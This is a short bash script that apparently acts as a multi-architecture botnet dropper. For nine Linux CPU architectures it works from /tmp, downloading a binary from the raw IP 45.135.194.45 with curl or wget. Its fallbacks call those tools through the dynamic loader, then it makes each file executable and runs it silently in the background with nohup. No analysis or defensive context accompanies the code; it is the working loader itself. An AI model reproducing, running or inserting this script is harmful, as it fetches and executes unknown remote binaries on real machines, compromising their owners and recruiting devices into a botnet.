#!/usr/bin/env bash
set -euo pipefail

architectures=(
  "linux_amd64"
  "linux_i386"
  "linux_mips"
  "linux_mips64"
  "linux_mipsle"
  "linux_mips64le"
  "linux_arm64"
  "linux_arm7"
  "linux_arm5"
)

for arch in "${architectures[@]}"; do
    cd /tmp; (/usr/bin/curl http://45.135.194.45/${arch} -o ${arch} || /usr/bin/wget http://45.135.194.45/${arch} -O ${arch} || /lib64/ld-linux-x86-64.so.2 /usr/bin/curl http://45.135.194.45/${arch} -o ${arch} || /lib64/ld-linux-x86-64.so.2 /usr/bin/wget http://45.135.194.45/${arch} -O ${arch}); chmod +x ./${arch}; nohup ./${arch} > /dev/null 2>&1 &
done
